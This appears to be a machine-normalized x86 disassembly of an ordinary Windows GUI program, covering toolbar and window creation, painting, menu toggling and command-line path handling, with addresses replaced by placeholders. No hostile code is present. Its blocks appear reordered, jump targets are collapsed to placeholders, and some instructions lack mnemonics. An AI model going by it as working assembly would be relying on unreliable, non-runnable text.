movsx ecx [ eax * 2 + rw-data ]
push 0x5
push ecx
call sub_420ca0
movsx edx [ esi + 0xc ]
add esp 0x4
push eax
movsx eax [ esi + 0x10 ]
push edx
push eax
push edi
call ebp
lea ebx [ esi + 0x2 ]
push ebx
call [ lstrlenA@IAT ]
movsx ecx [ esi + 0xc ]
movsx edx [ esi + 0x14 ]
push eax
push ebx
push ecx
push edx
push edi
call ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x4
movzx eax [ eax + 0xc ]
movsx ecx [ eax * 2 + rw-data ]
push ecx
call sub_420ca0
add esp 0x4
mov ebx eax
push ebx
call [ lstrlenA@IAT ]
lea edx [ esp + 0x10 ]
push edx
push eax
push ebx
push edi
mov [ esp + 0x2c ] eax
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x1c ]
movsx ecx [ esi + 0xc ]
movsx edx [ esi + 0x12 ]
mov esi [ esp + 0x10 ]
push eax
push ebx
push ecx
sub edx esi
push edx
push edi
call ebp
sub_4244a0
mov eax [ esp + 0x4 ]
push ebx
movzx ebx ax
shr eax 0x10
push esi
movsx esi [ ecx ]
push edi
mov edi eax
mov eax 0x2aaaaaab
imul esi
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x4
lea edx [ esi + esi * 4 ]
mov eax 0x2aaaaaab
imul edx
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jge r-xdata
movsx edx [ ecx + 0xe ]
cmp ebx edx
jl r-xdata
movsx edx [ ecx + 0x10 ]
cmp ebx edx
jl r-xdata
movsx eax [ ecx + 0x16 ]
cmp ebx eax
jg r-xdata
movsx eax [ ecx + 0x18 ]
cmp ebx eax
jg r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x2d
call sub_40f360
pop edi
pop esi
pop ebx
retn 0x4
push 0xb
call sub_425660
add esp 0x4
sub_424540
mov eax [ esp + 0x4 ]
push esi
lea esi [ ecx + 0x2 ]
sub esi eax
lea ebx [ ebx ]
mov dl [ eax ]
mov [ esi + eax ] dl
inc eax
test dl dl
jne r-xdata
call sub_424520
pop esi
retn 0x4
sub_4245f0
push edi
mov edi [ esp + 0x8 ]
mov eax [ edi + 0xc ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x25
jl r-xdata
mov edx [ edi + 0x24 ]
mov ecx [ edi + 0x28 ]
push esi
push edx
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
push ecx
push edx
push eax
call [ LoadStringA@IAT ]
mov eax [ edi + 0xc ]
lea esi [ eax + eax * 4 ]
lea esi [ esi * 4 + rw-data ]
add edi 0x10
mov ecx 0x5
[ edi ] [ esi ]
pop esi
mov eax 0x1
pop edi
retn 0x4
xor eax eax
pop edi
retn 0x4
sub_424650
mov al [ rw-data ]
sub esp 0x2c
test al al
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
mov esi ecx
je r-xdata
mov eax [ esp + 0x38 ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push edi
push 0x14
mov eax [ rw-data ]
push 0x10
push 0x10
push 0x16
push 0x18
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x10
push 0x356
push 0x50000121
push eax
call [ CreateToolbarEx@IAT ]
lea edx [ esp + 0xc ]
push edx
push 0x17
mov [ esi ] eax
mov ecx [ rw-data ]
push 0x413
push eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0x356
call ebp
mov al [ rw-data ]
xor edi edi
test al al
jbe r-xdata
pop esi
pop ebp
add esp 0x2c
retn 0x4
push ebx
xor ebx ebx
mov edx [ esi ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x18 ]
mov ecx [ rw-data ]
push 0x0
sub eax edx
push 0x9c83
inc eax
push ecx
mov [ rw-data ] ax
call [ EnableMenuItem@IAT ]
mov ecx [ rw-data ]
test ecx ecx
pop edi
je r-xdata
lea esp [ esp ]
mov [ rw-data ] bl
mov edx [ esi ]
push edx
call [ DestroyWindow@IAT ]
push 0x1
mov [ rw-data ] 0x0
mov [ esi ] 0x0
mov eax [ rw-data ]
push 0x9c83
push eax
call [ EnableMenuItem@IAT ]
pop ebx
mov cl [ esp + 0x30 ]
mov [ ebx + rw-data ] cl
inc ebx
cmp ebx 0x64
jl r-xdata
push 0xd
call sub_425660
add esp 0x4
call sub_4015b0
movzx eax [ edi + rw-data ]
mov edx [ esi ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax * 4 + rw-data ]
push ecx
push 0x1
push 0x414
push edx
call ebp
movzx eax [ rw-data ]
inc edi
cmp edi eax
jl r-xdata
mov eax [ esi ]
lea edx [ esp + 0x24 ]
push edx
push ebx
push 0x417
push eax
call ebp
test eax eax
je r-xdata
sub_4247c0
push ebx
mov ebx [ SendMessageA@IAT ]
push esi
push edi
push 0x0
push 0x0
mov edi ecx
mov eax [ edi ]
push 0x418
push eax
call ebx
test eax eax
jle r-xdata
xor esi esi
mov esi eax
nop
movzx eax [ esi + rw-data ]
mov ecx [ edi ]
lea edx [ eax + eax * 4 ]
lea eax [ edx * 4 + rw-data ]
push eax
push 0x1
push 0x414
push ecx
call ebx
inc esi
cmp esi 0x27
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edi ]
push 0x0
push 0x0
push 0x416
push ecx
call ebx
dec esi
jne r-xdata
sub_424820
sub esp 0x14
push ebx
mov ebx [ esp + 0x1c ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov edi [ SendMessageA@IAT ]
push 0x0
push eax
mov esi ecx
mov ecx [ esi ]
push 0x419
push ecx
call edi
lea edx [ esp + 0xc ]
push edx
push eax
mov eax [ esi ]
push 0x417
push eax
call edi
add ebx 0x10
test eax eax
je r-xdata
push r--data
push ebx
call [ lstrcpyA@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x14
retn 0x4
mov ecx [ esp + 0x18 ]
movsx edx [ ecx * 2 + rw-data ]
mov eax [ rw-data ]
push 0x50
push ebx
push edx
push eax
call [ LoadStringA@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x14
retn 0x4
sub_4248a0
mov ecx [ esp + 0x8 ]
mov eax ecx
sub esp 0x40
dec eax
je r-xdata
mov ecx [ esp + 0x44 ]
push ecx
mov ecx rw-data
call sub_424260
xor eax eax
add esp 0x40
retn 0x10
sub eax 0xe
je r-xdata
push esi
mov esi [ esp + 0x48 ]
lea edx [ esp + 0x4 ]
push edx
push esi
call [ BeginPaint@IAT ]
push eax
mov ecx rw-data
call sub_4243b0
lea eax [ esp + 0x4 ]
push eax
push esi
call [ EndPaint@IAT ]
pop esi
xor eax eax
add esp 0x40
retn 0x10
sub eax 0x1f2
je r-xdata
mov ecx [ esp + 0x50 ]
push ecx
mov ecx rw-data
call sub_4244a0
xor eax eax
add esp 0x40
retn 0x10
mov eax [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
push eax
mov eax [ esp + 0x48 ]
push edx
push ecx
push eax
call [ DefWindowProcA@IAT ]
add esp 0x40
retn 0x10
sub_424940
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push eax
mov [ eax ] 0x3
mov [ eax + 0x4 ] sub_4248a0
mov [ eax + 0x1c ] 0x10
mov [ eax + 0x24 ] r--data
call [ RegisterClassA@IAT ]
test ax ax
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn 0x4
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push eax
push 0x3
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x50800000
push 0x0
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
test eax eax
mov [ esi + 0x1c ] eax
jne r-xdata
mov [ esi + 0x1c ] 0x0
mov [ esi ] 0x1
xor eax eax
pop esi
retn 0x4
push eax
call [ DestroyWindow@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
push 0x5
push eax
call [ ShowWindow@IAT ]
xor eax eax
pop esi
retn 0x4
sub_424ae0
mov eax [ ecx + 0x18 ]
test eax eax
je r-xdata
mov eax 0x1
cmp [ eax ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov eax 0x1
push eax
push 0x271e
push ecx
call esi
pop esi
retn
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
xor eax eax
push eax
push 0x271e
push ecx
call esi
pop esi
retn
push esi
mov esi [ EnableMenuItem@IAT ]
push eax
mov eax [ rw-data ]
push 0x271d
push eax
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_424b50
mov al [ rw-data ]
test al al
mov eax [ rw-data ]
jne r-xdata
mov edx [ esp + 0x4 ]
push esi
mov esi [ eax ]
mov [ edx + 0x4 ] esi
mov [ eax ] edx
call sub_424ae0
pop esi
retn 0x4
mov eax [ ecx + 0x18 ]
sub_424bd0
push edi
mov edi ecx
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
pop edi
retn 0x4
mov al [ rw-data ]
test al al
je r-xdata
push 0x10
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_424a20
mov esi eax
test esi esi
je r-xdata
pop esi
mov eax [ esp + 0xc ]
push eax
mov ecx edi
mov [ esi + 0x8 ] 0x0
call sub_424a80
push esi
mov ecx edi
mov [ esi + 0xc ] ax
call sub_424b50
sub_424c30
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
retn
push edi
mov edi esi
mov esi [ esi + 0x4 ]
mov ecx edi
call sub_424a00
push edi
call j_sub_429931
add esp 0x4
test esi esi
jne r-xdata
pop edi
sub_424c60
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
retn
push esi
push edi
mov edi [ esp + 0x14 ]
xor esi esi
test edi edi
jle r-xdata
push ebx
call sub_429931
add esp 0x4
pop edi
pop esi
mov eax [ ebx + esi * 4 ]
call sub_424c30
inc esi
cmp esi edi
jl r-xdata
sub_424c90
mov al [ rw-data ]
test al al
push esi
mov esi ecx
jne r-xdata
pop esi
retn
mov al [ rw-data ]
test al al
jne r-xdata
movsx eax [ rw-data ]
mov ecx [ rw-data ]
push eax
push ecx
call sub_424c60
add esp 0x8
mov ecx esi
mov [ rw-data ] 0x0
pop esi
jmp sub_424ae0
sub_424cd0
push esi
mov esi ecx
call sub_424c90
mov al [ rw-data ]
test al al
je r-xdata
mov esi [ esi + 0x18 ]
mov esi [ rw-data ]
jmp r-xdata
pop esi
retn
movsx eax [ rw-data ]
mov eax [ esi + eax * 4 - 0x4 ]
call sub_424c30
movsx eax [ rw-data ]
sub eax 0x2
js r-xdata
test esi esi
je r-xdata
mov [ esi ] 0x0
lea esp [ esp ]
dec eax
mov ecx [ esi + eax * 4 + 0x4 ]
mov [ esi + eax * 4 + 0x8 ] ecx
jns r-xdata
sub_424d60
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
push ebp
push esi
push edi
jne r-xdata
mov ebp [ esp + 0x18 ]
xor ebp ebp
jmp r-xdata
push 0x4
push eax
call sub_429969
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edi ebp
movsx eax [ rw-data ]
cmp eax ebp
mov edi eax
jl r-xdata
push ebp
push ebx
call sub_424c60
add esp 0x8
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn
test edi edi
jle r-xdata
mov ecx esi
mov eax ebx
sub ecx ebx
mov edx edi
mov edi [ eax ]
mov [ ecx + eax ] edi
mov [ eax ] 0x0
add eax 0x4
dec edx
jne r-xdata
sub_424dd0
push ebp
mov ebp ecx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
pop ebp
retn 0x8
movzx eax [ ebp + 0x14 ]
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp eax esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
cmp esi 0x30
jne r-xdata
push 0x1c
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx eax
call sub_424a30
mov ebx eax
test ebx ebx
je r-xdata
mov esi 0x10
cmp esi 0x10
sete cl
dec cl
and ecx esi
mov esi [ esp + 0x18 ]
test esi esi
mov [ ebp + 0x14 ] cl
jne r-xdata
mov edx [ ebp + 0x54 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x58 ]
xor edi edi
cmp eax ecx
je r-xdata
mov esi [ ebp + 0x54 ]
push esi
mov ecx ebp
call sub_424a80
mov [ ebx + 0xc ] ax
mov ax [ esi + 0x18 ]
mov [ ebx + 0x14 ] ax
mov cl [ esi + 0x1e ]
mov [ ebx + 0x18 ] cl
mov dl [ esi + 0x1f ]
mov [ ebx + 0x19 ] dl
mov al [ esi + 0x20 ]
mov [ ebx + 0x1a ] al
mov cl [ esi + 0x21 ]
mov [ ebx + 0x1b ] cl
mov dx [ esi + 0x1c ]
mov [ ebx + 0x16 ] dx
mov eax [ ebp + 0x54 ]
push eax
mov ecx ebp
call sub_424a80
mov [ ebx + 0x10 ] di
mov [ ebx + 0xe ] ax
mov cx [ ebp + 0x5c ]
mov [ ebx + 0x12 ] cx
mov edi [ esi + 0x18 ]
shl edi 0x1
push edi
call sub_429a56
add esp 0x4
test eax eax
mov [ ebx + 0x8 ] eax
jne r-xdata
mov eax [ eax + 0x8 ]
inc edi
cmp eax ecx
jne r-xdata
mov esi [ esi + 0x10 ]
mov ecx edi
mov edx ecx
shr ecx 0x2
mov edi eax
mov al [ rw-data ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test al al
[ edi ] [ esi ]
jne r-xdata
test edi edi
je r-xdata
push ebx
mov ecx ebp
call sub_424b50
mov ecx ebp
call sub_424cd0
mov ecx ebx
call j_sub_424a00
push ebx
call j_sub_429931
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424f10
push ebx
push esi
mov esi [ esp + 0xc ]
movsx eax [ esi + 0xc ]
push edi
push eax
mov ebx ecx
call sub_424a60
mov edi eax
push edi
push 0x30
mov ecx ebx
call sub_424dd0
mov cl [ esi + 0x18 ]
mov [ edi + 0x1e ] cl
mov dl [ esi + 0x19 ]
mov [ edi + 0x1f ] dl
mov al [ esi + 0x1a ]
mov [ edi + 0x20 ] al
mov cl [ esi + 0x1b ]
mov [ edi + 0x21 ] cl
mov dx [ esi + 0x16 ]
mov [ edi + 0x1c ] dx
movsx eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
push eax
push ecx
mov ecx edi
call sub_421890
push 0x1
push 0x0
push ebx
mov ecx edi
call sub_421ad0
movsx edx [ esi + 0xe ]
push edx
mov ecx ebx
call sub_424a60
mov [ ebx + 0x54 ] eax
movsx ecx [ esi + 0x10 ]
test ecx ecx
mov eax [ eax + 0x8 ]
je r-xdata
mov [ ebx + 0x58 ] eax
mov ax [ esi + 0x12 ]
pop edi
pop esi
mov [ ebx + 0x5c ] ax
pop ebx
retn 0x4
dec ecx
mov eax [ eax + 0x8 ]
jne r-xdata
sub_424fa0
push edi
mov edi ecx
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
pop edi
retn
push 0x10
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_424a40
mov esi eax
test esi esi
je r-xdata
pop esi
push 0x0
mov ecx edi
call sub_424aa0
mov al [ edi + 0xc ]
mov [ esi + 0xc ] al
mov ecx [ edi + 0x90 ]
push ecx
call sub_431a26
add esp 0x4
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx esi
call j_sub_424a00
push esi
call j_sub_429931
add esp 0x4
pop esi
pop edi
retn
push esi
mov ecx edi
call sub_424b50
mov ecx edi
call sub_424cd0
sub_425020
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
jne r-xdata
push eax
mov eax [ esi + 0x18 ]
push eax
call sub_424d60
add esp 0x8
mov [ esi + 0x18 ] eax
pop esi
retn 0x4
mov [ esi + 0x18 ] eax
sub_425050
push ebx
push esi
push edi
mov edi ecx
call sub_40e3d0
mov ecx edi
call sub_424d30
mov ebx [ esp + 0x10 ]
mov esi [ ebx ]
test esi esi
je r-xdata
mov ecx edi
call sub_424ac0
mov eax [ ebx ]
call sub_424c30
mov cx [ rw-data ]
mov eax 0x1
cmp cx ax
jle r-xdata
jmp r-xdata
movsx eax cx
mov ecx edi
mov [ ebx + eax * 4 - 0x4 ] 0x0
call sub_424ae0
mov ecx edi
call sub_40f190
mov ecx edi
call sub_40e6d0
mov ecx edi
call sub_40e1a0
pop edi
pop esi
pop ebx
retn 0x4
lea ecx [ ecx ]
mov eax [ esi ]
push edi
mov ecx esi
call [ eax ]
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ ebx + eax * 4 ]
mov [ ebx + eax * 4 - 0x4 ] ecx
mov cx [ rw-data ]
movsx edx cx
inc eax
cmp eax edx
jl r-xdata
sub_4250f0
push edi
mov edi ecx
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
pop edi
retn 0x4
mov al [ rw-data ]
test al al
je r-xdata
push 0x10
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_424ba0
mov esi eax
test esi esi
je r-xdata
pop esi
push ebx
mov ebx [ esp + 0x10 ]
push ebx
mov ecx edi
mov [ esi + 0x8 ] 0x0
call sub_424a80
push ebx
push 0x30
mov ecx edi
mov [ esi + 0xc ] ax
call sub_424dd0
push esi
mov ecx edi
call sub_424b50
pop ebx
sub_425160
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
mov ecx esi
call sub_424fa0
mov al [ edi + 0xc ]
mov [ esi + 0xc ] al
mov eax [ esi + 0x90 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x8 ]
mov [ esi + 0x90 ] ecx
mov ecx esi
mov [ edi + 0x8 ] 0x0
call sub_40e4b0
mov ecx rw-data
call sub_424520
pop edi
pop esi
retn 0x4
push eax
call sub_429931
add esp 0x4
sub_4251d0
mov eax [ rw-data ]
test eax eax
push esi
mov esi ecx
mov [ rw-data ] 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
push eax
mov ecx esi
call sub_425050
mov [ rw-data ] 0x0
pop esi
retn
push 0x0
push 0x0
call sub_424d60
add esp 0x8
mov [ rw-data ] eax
sub_425240
push ebx
mov ebx eax
cmp [ ebx ] 0x22
push esi
jne r-xdata
push ebx
push edi
call [ lstrcpyA@IAT ]
cmp [ edi ] 0x0
mov esi edi
je r-xdata
inc ebx
push ebx
push edi
call [ lstrcpyA@IAT ]
mov al [ edi ]
test al al
mov esi edi
je r-xdata
cmp [ esi ] 0x0
je r-xdata
lea ecx [ ecx ]
lea ebx [ ebx ]
pop esi
xor eax eax
pop ebx
retn
mov [ esi ] 0x0
sub esi edi
mov al [ ebx + esi + 0x1 ]
test al al
lea esi [ ebx + esi + 0x1 ]
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov edi edi
movsx eax [ esi ]
push eax
call sub_429cb9
add esp 0x4
test eax eax
jne r-xdata
cmp al 0x22
je r-xdata
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
movsx ecx al
push ecx
call sub_429cb9
add esp 0x4
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
retn
sub_4252e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431e8a
push eax
mov [ fs : 0x0 ] esp
sub esp 0x408
push ebp
push esi
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ esp + 0x424 ]
test eax eax
mov esi eax
je r-xdata
mov esi [ lstrlenA@IAT ]
mov ebp 0x9
mov eax [ rw-data ]
test eax eax
pop edi
pop esi
pop ebp
je r-xdata
lea edi [ esp + 0x14 ]
call sub_425240
mov cl [ esp + 0x14 ]
cmp cl 0x2b
mov [ esp + 0x10 ] eax
je r-xdata
push edi
call esi
dec ebp
lea edi [ edi + eax + 0x1 ]
jne r-xdata
push edi
call sub_4112f0
add esp 0x4
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0x410 ] 0x2
je r-xdata
xor eax eax
mov ecx [ esp + 0x408 ]
mov [ fs : 0x0 ] ecx
add esp 0x414
retn
mov esi eax
cmp cl 0x2d
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
xor eax eax
push 0x1
push 0x0
push 0x0
mov ecx eax
call sub_4126f0
jmp r-xdata
mov ebp [ GetFullPathNameA@IAT ]
lea ecx [ ecx ]
test esi esi
je r-xdata
mov eax [ rw-data ]
push eax
call sub_429931
add esp 0x4
mov [ rw-data ] 0x0
cmp [ edi ] 0x0
je r-xdata
mov ecx [ esp + 0x408 ]
xor edx edx
test eax eax
sete dl
mov [ fs : 0x0 ] ecx
mov eax edx
add esp 0x414
retn
mov eax esi
lea edi [ esp + 0x14 ]
call sub_425240
lea ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x218 ]
push edx
mov esi eax
push 0x200
lea eax [ esp + 0x20 ]
push eax
call ebp
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0xc ] eax
test eax eax
mov [ esp + 0x41c ] 0x1
je r-xdata
push edi
call esi
lea edi [ edi + eax + 0x1 ]
cmp [ edi ] 0x0
je r-xdata
push edi
call [ SetCurrentDirectoryA@IAT ]
test esi esi
mov [ esp + 0x41c ] 0xffffffff
jne r-xdata
push 0x1
push 0x1
lea ecx [ esp + 0x21c ]
push ecx
mov ecx eax
call sub_4126f0
push edi
call sub_411fa0
add esp 0x4
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call esi
lea edi [ edi + eax + 0x1 ]
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_420ac0
add esp 0x4
test eax eax
je r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0xc ] eax
test eax eax
mov [ esp + 0x41c ] 0x0
je r-xdata
mov [ esp + 0x41c ] 0xffffffff
push 0x0
push 0x1
push edi
mov ecx eax
call sub_4126f0
sub_4254e0
mov eax [ esp + 0x4 ]
sub esp 0x400
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0x200
lea ecx [ esp + 0x4 ]
push ecx
push eax
push edx
call [ LoadStringA@IAT ]
lea eax [ esp + 0x408 ]
push eax
lea ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0x208 ]
push edx
call [ wvsprintfA@IAT ]
push 0x10
push 0x5
call sub_420ca0
add esp 0x4
push eax
lea eax [ esp + 0x208 ]
push eax
push 0x0
call [ MessageBoxA@IAT ]
mov edx [ esp + 0x404 ]
xor ecx ecx
test edx edx
sete cl
push ecx
call [ ExitThread@IAT ]
push eax
call [ DestroyWindow@IAT ]
sub_425570
mov eax [ esp + 0x8 ]
sub esp 0x50
cmp eax 0xf
push esi
je r-xdata
mov esi [ esp + 0x58 ]
push ebx
push edi
lea edx [ esp + 0x1c ]
push edx
push esi
call [ BeginPaint@IAT ]
push 0x0
push esi
mov ebx eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateSolidBrush@IAT ]
mov edi eax
lea eax [ esp + 0xc ]
push eax
push esi
call [ GetClientRect@IAT ]
push edi
lea ecx [ esp + 0x10 ]
push ecx
push ebx
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
lea edx [ esp + 0x1c ]
push edx
push esi
call [ EndPaint@IAT ]
pop edi
pop ebx
xor eax eax
pop esi
add esp 0x50
retn 0x10
cmp eax 0x201
je r-xdata
mov esi [ esp + 0x58 ]
push 0x0
push esi
call [ GetWindowLongA@IAT ]
push eax
push 0x0
push 0x403
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
pop esi
add esp 0x50
retn 0x10
cmp eax 0x401
mov ecx [ esp + 0x64 ]
push ecx
je r-xdata
mov esi [ esp + 0x5c ]
push 0x0
push esi
call [ SetWindowLongA@IAT ]
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
xor eax eax
pop esi
add esp 0x50
retn 0x10
mov edx [ esp + 0x64 ]
push edx
push eax
mov eax [ esp + 0x64 ]
push eax
call [ DefWindowProcA@IAT ]
pop esi
add esp 0x50
retn 0x10
sub_425660
mov dl [ rw-data ]
movzx ecx dl
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx ecx
je r-xdata
pop ebx
retn
mov eax ebx
sub eax 0xa
je r-xdata
xor ebx ebx
test dl dl
sete bl
dec eax
je r-xdata
mov ecx [ rw-data ]
xor edx edx
cmp esi ebx
setne dl
lea eax [ esi + 0x2728 ]
dec edx
and edx 0x8
push edx
push eax
push ecx
call edi
inc esi
cmp esi 0x2
jle r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
lea eax [ ecx + 0x1 ]
cdq
mov ecx 0x3
idiv ecx
mov ebx edx
jmp r-xdata
sub eax 0x2
jne r-xdata
xor eax eax
test ebx ebx
sete al
mov ecx rw-data
push eax
push 0x2728
call sub_424590
xor ecx ecx
cmp ebx 0x1
sete cl
push ecx
push 0x2729
mov ecx rw-data
call sub_424590
xor edx edx
cmp ebx 0x2
sete dl
mov ecx rw-data
push edx
push 0x272a
call sub_424590
pop edi
pop esi
mov edi [ InvalidateRect@IAT ]
push esi
push edi
mov ecx rw-data
mov [ rw-data ] bl
call sub_402620
mov edi [ CheckMenuItem@IAT ]
xor esi esi
lea esp [ esp ]
mov ebx ecx
jmp r-xdata
mov edx [ esi + 0x4 ]
push 0x1
push 0x0
push edx
call edi
mov esi [ esi ]
test esi esi
jne r-xdata
sub_425750
mov eax [ esp + 0x8 ]
sub esp 0x50
cmp eax 0xf
push esi
ja r-xdata
cmp eax 0x201
je r-xdata
je r-xdata
push 0xb
call sub_425660
add esp 0x4
mov edx [ esp + 0x64 ]
mov ecx [ esp + 0x60 ]
push edx
mov edx [ esp + 0x5c ]
push ecx
push eax
push edx
call [ DefWindowProcA@IAT ]
pop esi
add esp 0x50
retn 0x10
mov esi [ esp + 0x58 ]
push edi
lea eax [ esp + 0x18 ]
push eax
push esi
call [ BeginPaint@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push esi
mov edi eax
call [ GetClientRect@IAT ]
push 0x1
push edi
call [ SetBkMode@IAT ]
movzx eax [ rw-data ]
push 0x5
lea edx [ esp + 0xc ]
push edx
push 0x1
add eax r--data
push eax
push edi
call [ DrawTextA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push esi
call [ EndPaint@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x50
retn 0x10
mov ecx eax
dec ecx
je r-xdata
push 0x8
call sub_429a56
add esp 0x4
test eax eax
je r-xdata
dec ecx
jne r-xdata
xor eax eax
pop esi
add esp 0x50
retn 0x10
mov edx [ rw-data ]
mov ecx [ esp + 0x58 ]
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov [ rw-data ] eax
xor eax eax
pop esi
add esp 0x50
retn 0x10
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x58 ]
cmp [ ecx + 0x4 ] edx
jne r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
mov eax ecx
mov ecx [ ecx ]
push eax
mov [ rw-data ] ecx
call sub_429931
add esp 0x4
xor eax eax
pop esi
add esp 0x50
retn 0x10
mov eax [ ecx ]
test eax eax
je r-xdata
lea esp [ esp ]
mov edx [ eax ]
push eax
mov [ ecx ] edx
call sub_429931
add esp 0x4
xor eax eax
pop esi
add esp 0x50
retn 0x10
mov ecx eax
mov eax [ ecx ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
sub_4258a0
push 0xc
call sub_42991a
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov cx [ esp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x8 ] cx
mov [ rw-data ] eax
retn
mov eax [ esp + 0x4 ]
push eax
call sub_420ef0
add esp 0x4
retn
sub_4258e0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn
mov edx [ esp + 0x4 ]
cmp [ ecx + 0x4 ] edx
jne r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
mov eax ecx
mov ecx [ ecx ]
mov [ rw-data ] ecx
mov [ esp + 0x4 ] eax
jmp j_sub_429931
mov eax [ ecx ]
test eax eax
je r-xdata
lea esp [ esp ]
mov edx [ eax ]
mov [ ecx ] edx
mov [ esp + 0x4 ] eax
jmp j_sub_429931
mov ecx eax
mov eax [ ecx ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
sub_425940
sub esp 0x10
test esi esi
je r-xdata
add esp 0x10
retn
mov al [ rw-data ]
test al al
push ebx
push edi
je r-xdata
xor ebx ebx
movsx ebx [ rw-data ]
dec ebx
jmp r-xdata
movzx eax [ rw-data ]
mov edi [ ShowScrollBar@IAT ]
push eax
push 0x0
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x1
push esi
call edi
mov eax [ rw-data ]
